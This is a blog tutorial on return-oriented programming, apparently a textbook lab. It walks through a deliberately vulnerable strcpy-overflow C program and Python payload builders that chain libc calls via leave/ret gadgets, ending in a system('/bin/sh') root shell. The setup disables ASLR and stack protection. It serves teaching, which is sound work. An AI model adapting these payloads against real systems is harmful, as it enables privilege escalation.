---
title: "Return-Oriented Programming"
date: 2021-02-04T09:03:22+08:00
draft: false
---

In the previous [post](https://chuang76.github.io/posts/return-to-libc/), we showed how to launch a return-to-libc attack, which chains two functions: system() and exit(). However, it is limited if we want to chain more functions to launch more complicated attacks. In 2001, Nergal extended the return-to-libc attack in [Phrack Magazine](http://phrack.org/issues/58/4.html). In 2007, Hovav Shacham published Return-Oriented Programming (ROP), a generalized technique that chains several code chunks (gadgets) to accomplish the exploit. In this article, we'll study how ROP works.  



## Setup

Environment

1. Google cloud virtual machine: Ubuntu 20.04
2. Linux kernel version: 5.4.0
3. Create a symbolic link from “/bin/zsh” to “/bin/sh” since /bin/dash in most Ubuntu systems prevents itself from being executed in a Set-UID process
4. Disable ASLR and Stackguard protection, but make the stack non-executable (our purpose of the experiment)



## Chain function calls without arguments

We first show how to chain function calls without arguments. Here is a vulnerable program called rop.c. Our goal is to invoke the function foo() in the following program 10 times based on a crafted stack frame. 

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int bof(char* str)
{
	char buffer[100]; 
	unsigned int* framep; 

	asm("movl %%ebp, %0" : "=r" (framep));             // copy ebp 
	printf("ebp value = 0x%x\n", (unsigned)framep); 
	printf("buffer address = 0x%x\n", (unsigned)buffer); 

	strcpy(buffer, str);                               // buffer overflow 

	return 1; 
}

void foo() {
	static int i = 0; 
	printf("function foo() is called %d times\n", ++i);
}

void helper(int x) {
	printf("helper()'s argument = 0x%x\n", x);
}

int main(int argc, char** argv)
{
	char input[1000]; 
	FILE* badfile; 

	char* shell = getenv("my_shell"); 
	if (shell)
		printf("shell = %s, address = 0x%x\n", shell, (unsigned int)shell); 

	badfile = fopen("badfile", "r"); 
	fread(input, sizeof(char), 1000, badfile); 

	bof(input); 

	printf("return properly\n");
	return 1; 
}
```

According to the discussion in the previous [post](https://chuang76.github.io/posts/return-to-libc/), the stack should looks like this:

![](https://github.com/chuang76/image/blob/master/seed5-9.PNG?raw=true)

And we need to find out

1. the address of function foo()
2. the address of function exit()
3. the offset between the address of buffer and the old ebp 

To get the offset, we can execute the program to display the address of buffer and the ebp value. To get where is the address of function foo() and exit(), just set a breakpoint at main function and run the program via gdb debugger. 

![](https://github.com/chuang76/image/blob/master/seed5-2.PNG?raw=true)

![](https://github.com/chuang76/image/blob/master/seed5-1.PNG?raw=true)

As you can see, we need to cover 0xffffd118 - 0xffffd0a8 + 4 (the size of ebp), which equals to 116 bytes. The address of foo() is 0x565562d0 and the address of exit() is 0xf7e05f80. Okay, so now we can write a payload called test1.py as follows.  

```
#!/usr/bin/python3

import sys 

content = bytearray(0xaa for i in range(1000))
foo_addr = 0x565562d0 
exit_addr = 0xf7e05f80
start = 116 

for i in range(0, 10):
    content[start:start + 4] = (foo_addr).to_bytes(4, byteorder='little')
    start += 4
content[start:start + 4] = (exit_addr).to_bytes(4, byteorder='little')

with open("badfile", "wb") as f:
    f.write(content)
```

And here is the result, we invoke foo() 10 times successfully. 

![](https://github.com/chuang76/image/blob/master/seed5-4.PNG?raw=true)



## Chain function calls with arguments: skip prologue

So let's consider a more complicated situation. We are going to call the function helper() with an argument. However, there is no space for any arguments in the stack frame. How can we achieve our goal? Before finishing strcpy() and entering into helper(), there are a function epilogue and a function prologue. Let's review their instruction as follows. The instructions are in Intel syntax. We can observe that the (old) ebp value can be decided by us (the value y) before entering helper()'s prologue. 

```
strcpy()'s epilogue: 
mov esp, ebp                 -> esp = x, ebp = x
pop ebp                      -> esp = x + 4, ebp = *(x) = y
ret                          -> esp = x + 8, ebp = y 

helper()'s prologue:
push ebp                     -> esp = x + 8 - 4 = x + 4, ebp = y 
mov ebp, esp                 -> esp = x + 4, ebp = x + 4
```

Here is a trick. We can bypass the entire prologue of helper() to solve the space problem. But how many bytes should be skipped? Or what address should we land on? We can disassemble helper() in the gdb debugger to figure out.

![](https://github.com/chuang76/image/blob/master/seed5-6.PNG?raw=true)

Similarly, we need to find out the ebp value, the address of helper() and the address of exit(). 

![](https://github.com/chuang76/image/blob/master/seed5-8.PNG?raw=true)

![](https://github.com/chuang76/image/blob/master/seed5-5.PNG?raw=true)

So we can write a payload called test2.py. Note that the ebp value can be decided by us. Since we need some space for an argument, the ebp value of the next stack frame should be added 12. If more arguments are required, the distance should be larger. 

```
+---------------------+  
|     1st argument    |     ->   4 bytes
+---------------------+
|   return address    |     ->   4 bytes
+---------------------+
|      old   ebp      |     ->   4 bytes
+-------------------- +
```

Here is the payload. 

```
#!/usr/bin/python3 
import sys 

content = bytearray(0xaa for i in range(1000))
ebp_value = 0xffffd138 
helper_addr = 0x56556315 + 7     # skip prologue 
exit_addr = 0xf7e05f80 
start = 112

for i in range(0, 10):

    # ebp 
    ebp_value += 12
    content[start:start+4] = (ebp_value).to_bytes(4, byteorder='little')   
    start += 4

    # return address
    content[start:start+4] = (helper_addr).to_bytes(4, byteorder='little') 
    start += 4 

    # first argument
    content[start:start+4] = (0xaabbccdd).to_bytes(4, byteorder='little')   
    start += 4

# exit
content[start:start+4] = (0xffffffff).to_bytes(4, byteorder='little')
start += 4
content[start:start+4] = (exit_addr).to_bytes(4, byteorder='little')
start += 4
content[start:start+4] = (0xaabbccdd).to_bytes(4, byteorder='little')

with open("badfile", "wb") as f:
    f.write(content)
```

We can invoke helper() 10 times with the argument 0xaabbccdd successfully. 

![](https://github.com/chuang76/image/blob/master/seed5-7.PNG?raw=true)



## Chain function calls with arguments: leave ret

Unfortunately, the prologue-skipping approach has a limitation. The reason is that nowadays library functions are invoked via Procedure Linkage Table (PLT). If you are not familiar with PLT, you can check my previous [post](https://chuang76.github.io/posts/lazy_binding/) regards the lazy binding mechanism. 

Our goal is to jump to one function from another function. Let's say we'd like to invoke the function B() from the function A(). Since the prologue of B() can not be skipped, we use an extra function to serve this task. This extra function is very simple, it does nothing, just leave a function prologue and a function epilogue. So we can get a rule with the calculation from the previous section. 

```
A() -> extra() -> B()
        |          |_ keep prologue, now ebp = y + 4
        |
        |_ skip prologue, ebp = y (y is decided by us)
```

What is function extra() without prologue? Yes, it is a function epilogue! There are only two instructions in the function epilogue: `leave` and `ret`. According to the Intel developer's manual, the instruction leave = mov esp, ebp; pop ebp. We can generalize the rule as follows:

```
A() -> any function epilogue -> B()
              |_ leave, ret 
```

Image a situation: invoke a function C() from B() and invoke B() from A(). Assume that the initial ebp value is a + 4, let's re-calculate the esp value and esp value with leaveret approach. Note that when we operate the stack (push and pop), we actually access the memory. 

```
A()'s epilogue:
mov esp, ebp       -> 1. esp = a + 4, ebp = a + 4 
pop ebp            -> 2. esp = a + 8, ebp = *(a + 4) = b (retrieve data)
ret                -> 3. esp = a + 12, ebp = b, eip = *(a + 8) 

leave, ret 
mov esp, ebp       -> 4. esp = b, ebp = b
pop ebp            -> 5. esp = b + 4, ebp = *(b) = c (retrieve data)
ret                -> 6. esp = b + 8, ebp = c, eip = *(b + 4)

B()'s prologue:
push ebp           -> 7. esp = (b + 8) - 4 = b + 4, ebp = c, *(b + 4) = c (store data)
mov ebp, esp       -> 8. esp = b + 4, ebp = b + 4

B()'s epilogue:
mov esp, ebp       -> 9. esp = b + 4, ebp = b + 4 
pop ebp            -> 10. esp = b + 8, ebp = *(b + 4) = c (retrieve data)
ret                -> 11. esp = b + 12, ebp = c, eip = *(b + 8) 

leave, ret 
mov esp, ebp       -> 12. esp = c, ebp = c 
pop ebp            -> 13. esp = c + 4, ebp = *(c) = d (retrieve data)
ret                -> 14. esp = c + 8, ebp = d, eip = *(c + 4) 

C()'s prologue:
push ebp           -> 15. esp = (c + 8) - 4 = c + 4, ebp = d, *(c + 4) = d (store data)
mov ebp, esp       -> 16. esp = c + 4, ebp = c + 4 
...
```

So let's invoke the function printf() which is located in libc with the argument "hello". According to the calculation above, we can design a stack frame as follows. Note that the addresses on the left side are not actual addresses. They are just served for us to understand the concept easily. 

![](https://github.com/chuang76/image/blob/master/seed5-18.PNG?raw=true)

Find out the address of the string "hello" (define it as an environment variable) and the initial ebp value. 

![](https://github.com/chuang76/image/blob/master/seed5-10.PNG?raw=true)

Find out the address of printf(), exit(), leave and ret via gdb debugger.

![](https://github.com/chuang76/image/blob/master/seed5-12.PNG?raw=true) 

![](https://github.com/chuang76/image/blob/master/seed5-11.png?raw=true)

Here is the payload. 

```
#!/usr/bin/python3 
import sys 

start = 112
hello_addr = 0xffffdf81
ebp_value = 0xffffd128
printf_addr = 0xf7e21de0 
exit_addr = 0xf7e05f80 
leaveret = 0x565562ce 

content = bytearray(0xaa for i in range(1000))

# bof() to leaveret 
ebp_value += 8    
content[start:start+4] = (ebp_value).to_bytes(4, byteorder='little') 
start += 4
content[start:start+4] = (leaveret).to_bytes(4, byteorder='little') 
start += 4 

# printf 
for i in range(0, 10):
    ebp_value += 16 
    content[start:start+4] = (ebp_value).to_bytes(4, byteorder='little') 
    start += 4 
    content[start:start+4] = (printf_addr).to_bytes(4, byteorder='little') 
    start += 4 
    content[start:start+4] = (leaveret).to_bytes(4, byteorder='little') 
    start += 4
    content[start:start+4] = (hello_addr).to_bytes(4, byteorder='little') 
    start += 4

# exit 
content[start:start+4] = (0xffffffff).to_bytes(4, byteorder='little') 
start += 4
content[start:start+4] = (exit_addr).to_bytes(4, byteorder='little') 

with open("badfile", "wb") as f:
    f.write(content)
```

So we can invoke the function printf() with the argument "hello" 10 times successfully. 

![](https://github.com/chuang76/image/blob/master/seed5-13.PNG?raw=true)



## Exploit

We have understood how ROP works. Let's use leaveret approach to launch an attack and get the root privilege of the shell! That is, invoke the function system() which is located in libc with an argument "/bin/sh". Again, we need to find out 

1. the initial ebp value
2. how many bytes will lead to an overflow
3. the address of "/bin/sh"
4. the address of system()
5. the address of exit()
6. the address of leaveret 

![](https://github.com/chuang76/image/blob/master/seed5-14.PNG?raw=true)

![](https://github.com/chuang76/image/blob/master/seed5-15.PNG?raw=true)

![](https://github.com/chuang76/image/blob/master/seed5-16.PNG?raw=true)

Here is the payload. 

```
#!/usr/bin/python3 

import sys 

start = 112
bin_sh_addr = 0xffffdf7f
ebp_value = 0xffffd118
system_addr = 0xf7e13420 
exit_addr = 0xf7e05f80 
leaveret =  0x565562ce 

content = bytearray(0xaa for i in range(1000))

# bof() to leaveret 
ebp_value += 8    
content[start:start+4] = (ebp_value).to_bytes(4, byteorder='little') 
start += 4
content[start:start+4] = (leaveret).to_bytes(4, byteorder='little') 
start += 4 

# system
ebp_value += 16 
content[start:start+4] = (ebp_value).to_bytes(4, byteorder='little') 
start += 4 
content[start:start+4] = (system_addr).to_bytes(4, byteorder='little') 
start += 4 
content[start:start+4] = (leaveret).to_bytes(4, byteorder='little') 
start += 4
content[start:start+4] = (bin_sh_addr).to_bytes(4, byteorder='little') 
start += 4

# exit 
content[start:start+4] = (0xffffffff).to_bytes(4, byteorder='little') 
start += 4
content[start:start+4] = (exit_addr).to_bytes(4, byteorder='little') 

with open("badfile", "wb") as f:
    f.write(content)
```

After running the payload...voilà!

![](https://github.com/chuang76/image/blob/master/seed5-17.PNG?raw=true)



## Reference

1. Computer & Internet Security: A Hands-on Approach, Wenliang Du.